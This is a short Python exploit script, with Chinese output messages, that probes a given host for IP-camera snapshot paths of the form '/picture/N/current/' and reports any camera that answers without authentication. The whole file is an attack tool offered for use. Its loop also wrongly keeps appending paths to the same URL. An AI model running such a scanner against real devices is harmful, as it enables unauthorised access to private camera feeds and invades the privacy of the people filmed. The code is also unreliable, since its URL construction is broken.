import sys
import requests
def exp(url):
    for i in range(1,100):
        if url[-1] == "/":
            url = url + "picture/{0}/current/".format(i)
        else:
            url = url + "/picture/{0}/current/".format(i)
        rus = requests.get(url, verify=False)
        if "error" not in rus.text:
            print("可访问摄像头:{0}".format(url))
            break

if __name__ == '__main__':
    ip = sys.argv[1]
    print("正在测试IP:{0}".format(ip))
    exp(ip)
